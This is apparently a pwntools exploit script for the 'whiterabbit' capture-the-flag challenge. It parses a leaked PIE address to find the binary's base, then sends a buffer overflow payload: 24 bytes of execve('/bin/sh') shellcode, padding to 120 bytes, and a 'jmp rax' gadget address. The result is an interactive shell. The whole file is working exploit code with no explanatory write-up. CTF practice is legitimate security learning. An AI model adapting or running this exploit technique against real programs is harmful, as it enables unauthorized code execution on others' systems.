#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall")

gs = '''
b main
b *main+161
'''

context.update(arch='amd64',os='linux') # Needed for shellcode to work

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("whiterabbit.chal.wwctf.com", 1337)
    else:
        return process(elf.path)

# Plan:

# Addresses

# Functions

io = start()
padding = 120



io.recvuntil(b'> ', timeout=5)

pie_leak = io.recvline()

pie_leak = pie_leak.strip(b'\n')

pie_leak = int(pie_leak[2:], 16)

log.info("pieleak: %s"%hex(pie_leak))

main = pie_leak

main_off = 0x1180 # can also use elf.sym['main'] since it is main() that is leaked

ret_off = 0x101a

pie_base = pie_leak - elf.sym['main']

log.info("piebase: %s"%hex(pie_base))


# Shellcode is 24 bytes
shellcode = asm('\n'.join([
    'movabs rdi, 0x68732f6e69622f',
    'push rdi',
    'mov rdi, rsp',
    'and rsi, rdx',
    'xor rax, rax',
    'mov al, 59',
    'syscall',
]))

payload = shellcode + b"A"*(120-len(shellcode)) + p64(pie_base + next(elf.search(asm('jmp rax'))))
io.sendline(payload)

io.interactive()
